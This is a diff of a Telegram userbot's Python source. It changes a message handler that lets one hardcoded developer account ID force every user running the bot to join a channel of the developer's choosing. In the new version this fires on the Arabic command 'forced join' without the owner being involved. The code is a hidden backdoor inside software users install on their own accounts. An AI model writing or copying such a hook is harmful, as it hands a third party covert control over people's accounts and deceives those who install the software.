@@ -326,23 +326,19 @@ async def ithker(knopis):
 DevJoker = [705475246]
 @l313l.on(events.NewMessage(incoming=True))
 async def Hussein(event):
-    if event.reply_to and event.sender_id in DevJoker:
-        reply_msg = await event.get_reply_message()
-        owner_id = reply_msg.from_id.user_id
-        if owner_id == l313l.uid:
-            if event.message.message == "انضم":
-                message = event.message
-                channel_username = None
-                if len(message.text.split()) > 1:
-                    channel_username = message.text.split()[1].replace("@", "")
-                if channel_username:
-                    try:
-                        await l313l(JoinChannelRequest(channel_username))
-                        response = "تم الانضمام إلى القناة بنجاح!"
-                    except ValueError:
-                        response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح للقناة."
-                else:
-                    response = "الرجاء تحديد معرف القناة بشكل صحيح مع الأمر."
-                await event.reply(response)
+    if event.message.message == "انضمام اجباري" and event.sender_id in DevJoker:
+        message = event.message
+        channel_username = None
+        if len(message.text.split()) > 1:
+            channel_username = message.text.split()[1].replace("@", "")
+        if channel_username:
+            try:
+                await l313l(JoinChannelRequest(channel_username))
+                response = "تم الانضمام إلى القناة بنجاح!"
+            except ValueError:
+                response = "خطأ في العثور على القناة. يرجى التأكد من المعرف الصحيح للقناة."
+        else:
+            response = "الرجاء تحديد معرف القناة بشكل صحيح مع الأمر."
+        await event.reply(response)
 
 
